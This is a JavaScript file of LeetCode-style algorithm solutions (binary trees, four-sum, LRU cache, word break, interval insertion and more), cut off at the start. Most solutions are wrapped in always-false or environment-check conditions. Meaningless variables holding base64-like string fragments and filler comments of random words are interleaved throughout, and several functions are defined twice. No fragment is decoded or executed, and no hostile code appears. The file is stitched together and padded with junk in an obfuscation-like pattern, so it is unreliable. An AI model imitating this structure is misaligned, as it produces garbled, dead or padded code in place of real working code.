            nums[k] = nums[len - 1 - i];
            nums[len - 1 - i] = cur;
        }
    
    }

};

}

    var jjbmnlv = 'FnS0NGclpY';
    var wuaerbsbtf = 'AVyc';
if (typeof window === 'undefined') {
    /**
Given a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom.

For example:
Given the following binary tree,
   1            <---
 /   \
2     3         <---
 \     \
  5     4       <---
You should return [1, 3, 4].
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[]}
 */
var rightSideView = function(root) {
    var queue = [],
        result = [],
        i,
        len;
    
    if (!root) {
        return result;
    }
    
    queue.push(root);
    
    while (queue.length > 0) {
        len = queue.length;
        
        for (i = 0; i < len; i++) {
            node = queue.shift();
            
            // first one is the right most
            if (i === 0) {
                result.push(node.val);
            }
            
            if (node.right) {
                queue.push(node.right);
            }
            
            if (node.left) {
                queue.push(node.left);
            }
        }
    }
    
    return result;
};

}

    var nympvkcgu = 'a3ViV1';
if (!true && 1) {
    /**
Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target.

Note:
Elements in a quadruplet (a,b,c,d) must be in non-descending order. (ie, a ≤ b ≤ c ≤ d)
The solution set must not contain duplicate quadruplets.
    For example, given array S = {1 0 -1 0 -2 2}, and target = 0.

    A solution set is:
    (-1,  0, 0, 1)
    (-2, -1, 1, 2)
    (-2,  0, 0, 2)
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[][]}
 */
var fourSum = function(nums, target) {
    nums.sort(function(a, b) {
        return a - b;
    });
     
    var len = nums.length,
        result = [],
        i;
        
    kSum(result, [], 4, nums, target, 0, len - 1);
    
    return result;
};

function kSum(result, curArr, k, nums, target, startIndex, endIndex) {
    var len = nums.length,
        start,
        end,
        sum,
        i;
    
    if (k >= 3) {
        for (i = startIndex; i <= endIndex; i++) {
            if (i > startIndex && nums[i] === nums[i - 1]) {
                continue;
            }
            
            curArr.push(nums[i]);
            kSum(result, curArr.concat(), k - 1, nums, target - nums[i], i + 1, endIndex);
            curArr.pop();
        }
    }
    
    if (k === 1) {
        for (i = startIndex; i <= endIndex; i++) {
            if (nums[i] === target) {
                result.push(nums[i]);
            }
        }
    }
    
    if (k === 2) {
        start = startIndex;
        end = endIndex;
        
        while (start < end) {
            sum = nums[start] + nums[end];
            
            if (sum === target) {
                curArr.push(nums[start]);
                curArr.push(nums[end]);
                result.push(curArr.concat());
                curArr.pop();
                curArr.pop();
                
                start++;
                end--;
                
                while(nums[start] === nums[start - 1]) {
                    start++;
                }
                
                while(nums[end] === nums[end + 1]) {
                    end--;
                }
            } else if (sum < target) {
                start++;
            } else {
                end--;
            }
        }
    }
}

}

    var jqgfxltvm = 'cdiq';
    var wamvhfzzwk = 'YwWVN';
    var vuiomm = 'xGjvsT';
    var cojjvqgiap = 'COGZDQmxk';
if ('s' === 'O') {
    /**
Given a list of non negative integers, arrange them such that they form the largest number.

For example, given [3, 30, 34, 5, 9], the largest formed number is 9534330.

Note: The result may be very large, so you need to return a string instead of an integer.

 * @param {number[]} nums
 * @return {string}
 */
var largestNumber = function(nums) {
    var i,
        len = nums.length,
        result = '',
        startWithZero = true;
    nums.sort(function(a, b){
        var x = a + '' + b,
            y = b + '' + a;
        return parseInt(y) - parseInt(x);
    });
    for (i = 0; i < len; i++) {
        if (startWithZero && nums[i] !== 0) {
            startWithZero = false;
        }
        result += nums[i];
    }
    if (startWithZero) {
        return '0';
    }
    return result;
};

}

    var dijkpzw = 'yGYePMPWGd';
    var dsjlutyfkba = 'bVZ1ZEM1d';
    var nwfhbrsxop = 'iUllL';
if ('y' === 'O') {
    /**
Given a list of airline tickets represented by pairs of departure and arrival airports [from, to], reconstruct the itinerary in order. All of the tickets belong to a man who departs from JFK. Thus, the itinerary must begin with JFK.

Note:
If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary ["JFK", "LGA"] has a smaller lexical order than ["JFK", "LGB"].
All airports are represented by three capital letters (IATA code).
You may assume all tickets form at least one valid itinerary.
Example 1:
tickets = [["MUC", "LHR"], ["JFK", "MUC"], ["SFO", "SJC"], ["LHR", "SFO"]]
Return ["JFK", "MUC", "LHR", "SFO", "SJC"].
Example 2:
tickets = [["JFK","SFO"],["JFK","ATL"],["SFO","ATL"],["ATL","JFK"],["ATL","SFO"]]
Return ["JFK","ATL","JFK","SFO","ATL","SFO"].
Another possible reconstruction is ["JFK","SFO","ATL","JFK","ATL","SFO"]. But it is larger in lexical order.
*/
/**
 * @param {string[][]} tickets
 * @return {string[]}
 */
var findItinerary = function(tickets) {
    tickets.sort(function(a, b) {
       if (a[0] < b[0]) {
           return -1;
       } else if (a[0] > b[0]) {
           return 1;
       } else {
           if (a[1] < b[1]) {
               return -1;
           }
           
           return 1;
       }
    });
    
    var map = {},
        len = tickets.length,
        result = [],
        i;
        
    for (i = 0; i < len; i++) {
        if (map[tickets[i][0]] === undefined) {
            map[tickets[i][0]] = {};
            map[tickets[i][0]][tickets[i][1]] = 1;
        } else {
            if (map[tickets[i][0]][tickets[i][1]] === undefined) {
                map[tickets[i][0]][tickets[i][1]] = 1;
            } else {
                map[tickets[i][0]][tickets[i][1]]++;
            }
        }
    }
    
    result.push('JFK');
    
    dfs(result, 0, len, map);
    
    return result;
};

function dfs(result, index, len, map) {
    if (index === len) {
        return true;
    }
    
    var cur = result[index],
        dests = map[cur],
        count,
        i;
        
    for (var dest in dests) {
        count = dests[dest];
        
        if (count > 0) {
            dests[dest]--;
            result.push(dest);
            if (dfs(result, index + 1, len, map)) {
                return true;
            }
            dests[dest]++;
            result.pop();
        }
    }
    
    return false;
}

// SOLUTION 2: GREEDY https://leetcode.com/discuss/87314/non-recursive-time-space-solution-with-detail-explanations
/**
 * @param {string[][]} tickets
 * @return {string[]}
 */
var findItinerary = function(tickets) {
    tickets.sort(function(a, b) {
       if (a[0] < b[0]) {
           return -1;
       } else if (a[0] > b[0]) {
           return 1;
       } else {
           if (a[1] < b[1]) {
               return -1;
           }
           
           return 1;
       }
    });
    
    var map = {},
        len = tickets.length,
        result = [],
        i;
        
    for (i = 0; i < len; i++) {
        if (map[tickets[i][0]] === undefined) {
            map[tickets[i][0]] = [tickets[i][1]];
        } else {
            map[tickets[i][0]].push(tickets[i][1]);
        }
    }
    
    dfs('JFK', result, map);
    
    return result;
};

function dfs(cur, result, map) {
    var arr = map[cur];
    
    while (arr && arr.length > 0) {
        dfs(arr.shift(), result, map);
    }
    
    result.unshift(cur);
}

}

    var ompuyumqowpc = 'FpYUmhTMlY';
    var szqwuscmepn = 'IgYASOy';
// function function object world vljpxgz string compile code number return number number compile
    var xtjqlrpdkd = 'tsTBKBza';
    var nfzysqqyss = '1S1NBbUp';
if ('false' === true) {
    /**
Given a sorted array of integers, find the starting and ending position of a given target value.

Your algorithm's runtime complexity must be in the order of O(log n).

If the target is not found in the array, return [-1, -1].

For example,
Given [5, 7, 7, 8, 8, 10] and target value 8,
return [3, 4].


*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[]}
 */
var searchRange = function(nums, target) {
    var result = [],
        leftIndex = findLeftMost(target, nums),
        rightIndex = findRightMost(target, nums);
    
    result.push(leftIndex);    
    result.push(rightIndex);
    
    return result;
};

function findLeftMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            end = mid - 1;
        }
    }
    
    if (start >= 0 && start < len && nums[start] === target) {
        return start;
    }
    
    return -1;
}

function findRightMost(target, nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] > target) {
            end = mid - 1;
        } else if (nums[mid] < target) {
            start = mid + 1;
        } else {
            start = mid + 1;
        }
    }
    
    if (end >= 0 && end < len && nums[end] === target) {
        return end;
    }
    
    return -1;
}

}

    var wpmftvzjkg = 'PLarhKAxjX';
    var umwecldkuyhljf = 'nb2dJ';
    var qvjccqibhbt = 'QHEL';
if (null === 5) {
    /**
Given a sorted integer array without duplicates, return the summary of its ranges.

For example, given [0,1,2,4,5,7], return ["0->2","4->5","7"].
*/

/**
 * @param {number[]} nums
 * @return {string[]}
 */
var summaryRanges = function(nums) {
    var len = nums.length,
        result = [],
        curStr = '',
        curLen,
        curNum,
        i;
        
    if (len === 0) {
        return result;
    }
    
    curNum = nums[0];
    curStr += curNum;
    curLen = 1;
    
    for (i = 1; i < len; i++) {
        if (curNum + 1 === nums[i]) {
            curNum++;
            curLen++;
        } else {
            if (curLen > 1) {
                curStr += '->' + curNum;
            }
            
            result.push(curStr);
            curNum = nums[i];
            curLen = 1;
            curStr = '' + curNum;
        }
    }
    
    if (curLen > 1) {
        curStr += '->' + curNum;
    }
            
    result.push(curStr);
    return result;
};

}

    var butijgxmkxmb = 'Q0Fn';
    var cxomjnlf = 'kAsYYLyEF';
if (!true && 0) {
    /**
Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set.

get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.
set(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.
*/
class Node {
    constructor(key, val) {
        this.key = key;
        this.val = val;
        this.next = null;
        this.prev = null;
    }
}
/**
 * @constructor
 */
var LRUCache = function(capacity) {
    this.list = null;
    this.map = new Map();
    this.head = null;
    this.tail = null;
    this.size = capacity;
    this.curSize = 0;
};

/**
 * @param {number} key
 * @returns {number}
 */
LRUCache.prototype.get = function(key) {
    if (!this.map.get(key)) {
        return -1;
    }
    
    let node = this.map.get(key);
    
    if (node === this.head) {
        return node.val;
    }
    
    // remove node from list
    if (node === this.tail) {
        this.tail.prev.next = null;
        this.tail = this.tail.prev;
    } else {
        node.prev.next = node.next;
        node.next.prev = node.prev;
    }
    
    // insert node to head
    node.next = this.head;
    this.head.prev = node;
    this.head = node;
    
    return node.val;
};

/**
 * @param {number} key
 * @param {number} value
 * @returns {void}
 */
LRUCache.prototype.set = function(key, value) {
    let newNode = new Node(key, value);
    
    if (this.curSize === 0) {
        this.head = newNode;
        this.tail = newNode;
        this.curSize++;
    } else {
        newNode.next = this.head;
        this.head.prev = newNode;
        this.head = newNode;
        this.curSize++;
    }
    
    // update
    if (this.map.get(key)) {
        let oldNode = this.map.get(key);
        
        if (oldNode === this.tail) {
            this.tail = this.tail.prev;
            this.tail.next = null;
        } else {
            oldNode.prev.next = oldNode.next;
            oldNode.next.prev = oldNode.prev;
        }
        
        this.curSize--;
        this.map.set(key, newNode);
    } else {
        if (this.curSize > this.size) {
            //delete tail
            this.map.delete(this.tail.key);
            this.tail = this.tail.prev;
            this.tail.next = null;
            this.curSize--;
        }
        
        this.map.set(key, newNode);
    }
};

}

    var ansmhys = 'SUNBZ0lDZ';
    var qrlqmzygcwd = 'jXmpbfSh';
if (7 instanceof String) {
    /**
Given s1, s2, s3, find whether s3 is formed by the interleaving of s1 and s2.

For example,
Given:
s1 = "aabcc",
s2 = "dbbca",

When s3 = "aadbbcbcac", return true.
When s3 = "aadbbbaccc", return false.
*/

//dp
/**
 * @param {string} s1
 * @param {string} s2
 * @param {string} s3
 * @return {boolean}
 */
var isInterleave = function(s1, s2, s3) {
    let dp = [];
    const len1 = s1.length;
    const len2 = s2.length;
    const len3 = s3.length;
    
    if (len1 + len2 !== len3) {
        return false;
    }
    
    for (let i = 0; i <= len1; i++) {
        const arr = new Array(len2 + 1).fill(false);
        dp.push(arr);
    }
    
    dp[0][0] = true;
    
    for (let i = 1; i <= len1; i++) {
        dp[i][0] = s1.charAt(i - 1) === s3.charAt(i - 1);
        
        if (!dp[i][0]) {
            break;
        }
    }
    
    for (let j = 1; j <= len2; j++) {
        dp[0][j] = s2.charAt(j - 1) === s3.charAt(j - 1);
        
        if (!dp[0][j]) {
            break;
        }
    }
    
    for (let i = 1; i <= len1; i++) {
        for (let j = 1; j <= len2; j++) {
            let k = i + j - 1;
            
            dp[i][j] = (dp[i][j - 1] && (s2.charAt(j - 1) === s3.charAt(k))) || (dp[i - 1][j] && (s1.charAt(i - 1) === s3.charAt(k)));
        }
    }
    
    return dp[len1][len2];
};

// Time Limit Exceeded
/**
 * @param {string} s1
 * @param {string} s2
 * @param {string} s3
 * @return {boolean}
 */
var isInterleave = function(s1, s2, s3) {
    if (!s1) {
        return s2 === s3;
    }
    
    if (!s2) {
        return s1 === s3;
    }
    
    if (s3.length !== s1.length + s2.length) {
        return false;
    }
    
    const c1 = s1.charAt(0);
    const c2 = s2.charAt(0);
    const c3 = s3.charAt(0);
    
    if (c1 === c3 && c2 === c3) {
        return isInterleave(s1.substr(1), s2, s3.substr(1)) || isInterleave(s1, s2.substr(1), s3.substr(1));
    }
    
    if (c1 === c3) {
        return isInterleave(s1.substr(1), s2, s3.substr(1));
    }
    
    if (c2 === c3) {
        return isInterleave(s1, s2.substr(1), s3.substr(1));
    }
    
    return false;
};


}

// constant variable mhgkns number value await return world function compile value jroz world import
    var elyubyh = 'YIMTi';
if (7 === 18) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times) with the following restrictions:

You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).
After you sell your stock, you cannot buy stock on next day. (ie, cooldown 1 day)
Example:

prices = [1, 2, 3, 0, 2]
maxProfit = 3
transactions = [buy, sell, cooldown, buy, sell]
*/
/**
 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var len = prices.length,
        buy = [],
        sell = [],
        i;
    
    if (len < 2) {
        return 0;
    }
    
    // buy[i] 是指在第i天手上持有股票的最大收益
    // sell[i] 是指在第i天手上没有股票的最大收益
    buy[0] = 0 - prices[0];
    buy[1] = Math.max(0 - prices[0], 0 - prices[1]);
    sell[0] = 0;
    sell[1] = Math.max(0, buy[0] + prices[1]);
    
    for (i = 2; i < len; i++) {
        buy[i] = Math.max(buy[i - 1], sell[i - 2] - prices[i]);
        sell[i] = Math.max(sell[i - 1], buy[i - 1] + prices[i]);
    }
    
    return sell[len - 1];
};

}

    var kwuhtuwgb = '2hhMlY';
    var xsqtsxwf = 'XSBgUNAVlY';
    var gpeowjqwj = '1TG1Gc2R';
    var ovxdnz = 'rsShrjqao';
    var ebdmzevqeio = 'DQjhmQ0Js';
    var piojfbstbt = 'IBQi';
if (0.89 && false) {
    /**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    if (n == 1) {
        return true
    }
    if (n === 0 || n % 3 > 0) {
        return false
    }
    return isPowerOfThree(n / 3)
};

}

    var bmnsrp = 'ZG1W';
    var jecjxxjjl = 'JFWW';
    var bzowmxsz = 'dWRDN';
if (typeof document === 'undefined') {
    /**
Given an array of n integers where n > 1, nums, return an array output such that output[i] is equal to the product of all the elements of nums except nums[i].

Solve it without division and in O(n).

For example, given [1,2,3,4], return [24,12,8,6].

Follow up:
Could you solve it with constant space complexity? (Note: The output array does not count as extra space for the purpose of space complexity analysis.)
*/

/**
 * @param {number[]} nums
 * @return {number[]}
 * 
 * output[i] =  { i 前面的数的乘积}  X  { i 后面的数的乘积}
问题就解决了，首先从前往后扫描数组一遍，对每一个i，得到{i 前面的数的乘积}(可以称做output_before)，然后在从后往前扫描数组一遍，获得 { i 后面的数的乘积}(可以称做output_after)。 将两数相乘即为所求。
举个例子(如下图)，nums = {1,2,3,4}, 第一遍，从前往后扫描一遍，得到的output_before = {1, 1, 2, 6}. 从后往前扫描一遍，得到的output_after = {24, 12, 4, 1}.
 * 
 */
var productExceptSelf = function(nums) {
    var result = [],
        len = nums.length,
        back = 1,
        i;
    
    if (len === 0) {
        return result;
    }
    
    result[0] = 1;
    
    for (i = 1; i < len; i++) {
        result[i] = result[i - 1] * nums[i - 1]; 
    }
    
    for (i = len - 2; i >= 0; i--) {
        back *= nums[i + 1];
        result[i] *= back;
    }
    
    return result;
};

}

    var ohvkygi = 'lZeNk';
if (Array.isArray(4)) {
    /**
Given a linked list, reverse the nodes of a linked list k at a time and return its modified list.

If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is.

You may not alter the values in the nodes, only nodes itself may be changed.

Only constant memory is allowed.

For example,
Given this linked list: 1->2->3->4->5

For k = 2, you should return: 2->1->4->3->5

For k = 3, you should return: 3->2->1->4->5
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
 
// iterative solution, not recommended, very easy to make mistakes
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var dummy = new ListNode(0),
        i = 0,
        node = head,
        next,
        prevTail,
        curHead,
        curTail,
        nextHead,
        nextTail;
    
    while (node) {
        node = node.next;
        i++;
        
        if (i >= k) {
            break;
        }
    }
    
    if (k === 1 || i < k ) {
        return head;
    }
    
    i = 0;
    
    dummy.next = head;
    prevTail = dummy;
    node = head;
    
    while (node) {
        if (i === 0) {
            curTail = node;
            next = node.next;
            node.next = null;
            prevTail.next = node;
        } else {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
        }
        
        i++;
        
        if (i === k) {
            prevTail = curTail;
            i = 0;
        }
        
        node = next;
    }
    
    if (i < k) {
        node = prevTail.next;
        prevTail.next = null;
        
        while (node) {
            next = node.next;
            node.next = prevTail.next;
            prevTail.next = node;
            node = next;
        }
    }
    
    return dummy.next;
};

// recursive
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} k
 * @return {ListNode}
 */
var reverseKGroup = function(head, k) {
    var i = 0,
        newHead = head,
        dummy = new ListNode(0),
        prev,
        cur,
        next;
    
    for (i = 0; i < k; i++) {
        if (newHead === null) {
            return head;
        }
        
        newHead = newHead.next;
    }
    
    newHead = reverseKGroup(newHead, k);
    cur = head;
    dummy.next = newHead;
    
    for (i = 0; i < k; i++) {
        next = cur.next;
        cur.next = dummy.next;
        dummy.next = cur;
        cur = next;
    }
    
    return dummy.next;
};

}

    var krgatewps = 'Whi';
    var slumoaf = 'cDQxRAuc';
if ('l' === 'S') {
    /**
Given a string s and a dictionary of words dict, add spaces in s to construct a sentence where each word is a valid dictionary word.

Return all such possible sentences.

For example, given
s = "catsanddog",
dict = ["cat", "cats", "and", "sand", "dog"].

A solution is ["cats and dog", "cat sand dog"].


*/
// Time limit exceeded...
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    const len = s.length;
    let hasSeg = [];
    let result = [];
    let i, j;
    
    for (i = 0; i <= len; i++) {
        hasSeg.push(new Array(len + 1).fill(false));    
    }
    
    hasSeg[0][0] = true;
    
    for (i = 0; i <= len; i++) {
        for (j = i; j >= 0; j--) {
            if (wordDict.has(s.slice(j, i))) {
                hasSeg[j][i] = true;
            } else {
                for (let k = j; k < i; k++) {
                    if (hasSeg[j][k] && hasSeg[k][i]) {
                        hasSeg[j][i] = true;
                        break;
                    }
                }
            }
        }
    }
    
    helper(result, [], 0, s, wordDict, hasSeg);
    
    return result;
};

function helper(result, curArr, startIndex, s, wordDict, hasSeg) {
    if (startIndex === s.length) {
        result.push(curArr.join(' '));
    }
    
    for (let i = startIndex; i <= s.length; i++) {
        if (hasSeg[startIndex][i]) {
            if (wordDict.has(s.slice(startIndex, i))) {
                curArr.push(s.slice(startIndex, i));
                helper(result, curArr.concat(), i, s, wordDict, hasSeg);
                curArr.pop();
            }
        }
    }
}

// Memory limit exceeded
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {string[]}
 */
var wordBreak = function(s, wordDict) {
    let map = {};
    
    return helper(map, s, wordDict);
};

function helper(map, s, wordDict) {
    if (map.hasOwnProperty(s)) {
        return map[s];
    }
    
    let result = [];
    
    if (s.length === 0) {
        result.push('');
        return result;
    }
    
    wordDict.forEach(word => {
        if (s.startsWith(word)) {
            let subArr = helper(map, s.slice(word.length), wordDict);
            
            result.push((word + ' ' +  subArr.join(' ')).trim());
        }
    });
    
    map[s] = result;
    return result;
}

}

    var lbfivyjofygzl = 'SFJMWl';
if (0.63 && false) {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Your goal is to reach the last index in the minimum number of jumps.

For example:
Given array A = [2,3,1,1,4]

The minimum number of jumps to reach the last index is 2. (Jump 1 step from index 0 to 1, then 3 steps to the last index.)

Note:
You can assume that you can always reach the last index.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        step = 0,
        last = 0,
        cover = nums[0],
        i;
    
    for (i = 1; i < len; i++) {
        if (i > last) {
            last = cover;
            step++;
        }
        
        if (last >= len - 1) {
            break;
        }
        
        cover = Math.max(cover, nums[i] + i);
    }
    
    return step;
};


// time limit exceeded
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        result = [];
        
    result[0] = Number.MAX_VALUE;
    helper(0, nums, 0, 0, result);
    
    return result[0];
};

function helper(index, nums, cover, step, result) {
    if (cover < index || step > result[0]) {
        return;
    }
    
    if (cover >= nums.length - 1) {
        result[0] = Math.min(result[0], step);
        return;
    }
    
    var i = index;
    
    for (i = index; i <= cover; i++) {
        helper(i + 1, nums, Math.max(cover, nums[i] + i), step + 1, result);
    }
}


// memory limit exceed
/**
 * @param {number[]} nums
 * @return {number}
 */
var jump = function(nums) {
    var len = nums.length,
        dp = [],
        result = Number.MAX_VALUE,
        reachable = [],
        i,
        j;
    
    for (j = 0; j < len; j++) {
        reachable.push(new Array(len));
        for (i = j + 1; i < len; i++) {
            if (nums[j] + j >= i) {
                reachable[j][i] = true;
            } else {
                break;
            }
        }
    }
    dp[0] = 1;
    for (i = 1; i < len; i++) {
        // since there's always a solution
        dp[i] = dp[i - 1] + 1;
        
        for (j = 0; j < i; j++) {
            if (reachable[j][i]) {
                dp[i] = Math.min(dp[i], dp[j] + 1);
            }
        }
    }
    
    return dp[len - 1];
};

}

    var qsxeeojnvbp = 'PtYIttdnh';
    var ysbwollvynoutl = 'hrcElDWW';
    var yzksluzja = 'Arkdlm';
if ('e' === 'T') {
    /**
Given a set of non-overlapping intervals, insert a new interval into the intervals (merge if necessary).

You may assume that the intervals were initially sorted according to their start times.

Example 1:
Given intervals [1,3],[6,9], insert and merge [2,5] in as [1,5],[6,9].

Example 2:
Given [1,2],[3,5],[6,7],[8,10],[12,16], insert and merge [4,9] in as [1,2],[3,10],[12,16].

This is because the new interval [4,9] overlaps with [3,5],[6,7],[8,10].
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @param {Interval} newInterval
 * @return {Interval[]}
 */
var insert = function(intervals, newInterval) {
    var len = intervals.length,
        result = [],
        insertIndex = 0,
        curInterval,
        i;
    
    for (i = 0; i < len; i++) {
        curInterval = intervals[i];
        
        if (curInterval.end < newInterval.start) {
            result.push(curInterval);
            insertIndex++;
        } else if (curInterval.start > newInterval.end) {
            result.push(curInterval);
        } else {
            newInterval.start = Math.min(newInterval.start, curInterval.start);
            newInterval.end = Math.max(newInterval.end, curInterval.end);
        }
    }
    
    result.splice(insertIndex, 0, newInterval);
    
    return result;
};

}

    var gznovmxikvjm = '1DaU';
    var pmrnzosdrzjm = 'MqqpWXHd';
    var ohlhmth = 'FnSU';
    var jgtyvwopld = 'INrpum';
if (typeof navigator === 'undefined') {
    /**
The API: int read4(char *buf) reads 4 characters at a time from a file.

The return value is the actual number of characters read. For example, it returns 3 if there is only 3 characters left in the file.

By using the read4 API, implement the function int read(char *buf, int n) that reads n characters from the file.

Note:
The read function may be called multiple times. 
*/
/**
 * Definition for read4()
 * 
 * @param {character[]} buf Destination buffer
 * @return {number} The number of characters read
 * read4 = function(buf) {
 *     ...
 * };
 */

/**
 * @param {function} read4()
 * @return {function}
 */
var solution = function(read4) {
    let helperBuf = [];
    let count = 0; // how many characters read with read4
    let i = 0;
        
    /**
     * @param {character[]} buf Destination buffer
     * @param {number} n Maximum number of characters to read
     * @return {number} The number of characters read
     */
    return function(buf, n) {
        let pointer = 0;
        
        while (pointer < n) {
            if (i === 0) {
                count = read4(helperBuf);
            }
            
            while (i < count && pointer < n) {
                buf[pointer++] = helperBuf[i++];
            }
            
            // read4 buffer used up, start over
            if (i === count) {
                i = 0;
            }
            
            // end of file
            if (count < 4) {
                break;
            }
        }
        
        return pointer;
    };
};

}

    var tenalrha = 'NBZ';
if ('u' === 'O') {
    /**
Given a complete binary tree, count the number of nodes.

Definition of a complete binary tree from Wikipedia:
In a complete binary tree every level, except possibly the last, is completely filled, and all nodes in the last level are as far left as possible. It can have between 1 and 2h nodes inclusive at the last level h.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var countNodes = function(root) {
    if (root === null) {
        return 0;
    }
    
    var tmp = root,
        totalDep = 0,
        nodeNumsInLastLevel = 0,
        node = root,
        curDep,
        depSplit;
    
    while (tmp) {
        tmp = tmp.left;
        totalDep++;
    }
    
    curDep = 1;
    while (curDep < totalDep) {
        depSplit = findSplit(node);
        
        if (depSplit + curDep === totalDep) {
            nodeNumsInLastLevel += Math.pow(2, depSplit - 1);
            node = node.right;
        } else {
            node = node.left;
        }
        
        curDep++;
    }
    
    return Math.pow(2, totalDep - 1) + nodeNumsInLastLevel;
};

// find the depth of left most node in right subtree of current node
// binary search in last level
function findSplit(root) {
    if (!root || !root.right) {
        return 0;
    }
    
    var dep = 0,
        tmp = root;
    
    tmp = tmp.right;
    while(tmp) {
        dep++;
        tmp = tmp.left;
    }
    
    return dep;
}

}

    var biynysnkd = 'VVpfc';
    var xexrklwpylefh = '0lDQ';
    var jmymbzqgb = 'LwrUGkga';
if (3 === 12) {
    /**
Given preorder and inorder traversal of a tree, construct the binary tree.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number[]} preorder
 * @param {number[]} inorder
 * @return {TreeNode}
 */
var buildTree = function(preorder, inorder) {
    /**
    假设树的先序遍历是12453687，中序遍历是42516837。这里最重要的一点就是先序遍历可以提供根的所在，而根据中序遍历的性质知道根的所在就可以将序列分为左右子树。比如上述例子，我们知道1是根，所以根据中序遍历的结果425是左子树，而6837就是右子树。接下来根据切出来的左右子树的长度又可以在先序便利中确定左右子树对应的子序列（先序遍历也是先左子树后右子树）。根据这个流程，左子树的先序遍历和中序遍历分别是245和425，右子树的先序遍历和中序遍历则是3687和6837，我们重复以上方法，可以继续找到根和左右子树，直到剩下一个元素。可以看出这是一个比较明显的递归过程，对于寻找根所对应的下标，我们可以先建立一个HashMap，以免后面需要进行线行搜索，这样每次递归中就只需要常量操作就可以完成对根的确定和左右子树的分割。
    */
    var map = {},
        len = inorder.length,
        i;
    
    for (i = 0; i < len; i++) {
        map[inorder[i]] = i;
    }
    
    return helper(preorder, 0, len - 1, inorder, 0, len - 1, map);
};

function helper(preorder, preL, preR, inorder, inL, inR, map) {
    var root,
        index;
    
    if (preL > preR || inL > inR) {
        return null;
    }
    
    root = new TreeNode(preorder[preL]);
    index = map[root.val];
    
    root.left = helper(preorder, preL + 1, index - inL + preL, inorder, inL, index - 1, map);
    root.right = helper(preorder, index - inL + preL + 1, preR, inorder, index + 1, inR, map);
    
    return root;
}

}

    var ywzsidz = 'WdaWFpsY';
if (!true && 1) {
    /**
Write an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties:

Integers in each row are sorted from left to right.
The first integer of each row is greater than the last integer of the previous row.
For example,

Consider the following matrix:

[
  [1,   3,  5,  7],
  [10, 11, 16, 20],
  [23, 30, 34, 50]
]
Given target = 3, return true.
*/
/**
 * @param {number[][]} matrix
 * @param {number} target
 * @return {boolean}
 */
var searchMatrix = function(matrix, target) {
    var rLen = matrix.length,
        cLen,
        start,
        end,
        mid,
        i,
        j;
        
    if (rLen === 0) {
        return false;
    }
    
    cLen = matrix[0].length;
    start = 0;
    end = rLen * cLen - 1;
    
    while (start <= end) {
        mid = parseInt((start + end) / 2);
        i = parseInt(mid / cLen);
        j = mid % cLen;
        
        if (matrix[i][j] === target) {
            return true;
        }
        
        if (matrix[i][j] > target) {
            end = mid - 1;
        } else {
            start = mid + 1;
        }
    }
    
    return false;
};

}

    var nsnqlxlna = 'FFSwTrJwt';
if (!true && 0) {
    /**
Given a binary tree, find its minimum depth.

The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.

 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var minDepth = function(root) {
    if (root === null) {
        return 0;
    }
    
    if (root.left === null) {
        return minDepth(root.right) + 1;
    }
    
    if (root.right === null) {
        return minDepth(root.left) + 1;
    }
    
    return Math.min(minDepth(root.left), minDepth(root.right)) + 1;
};

}

    var rskwzmldur = 'm5R';
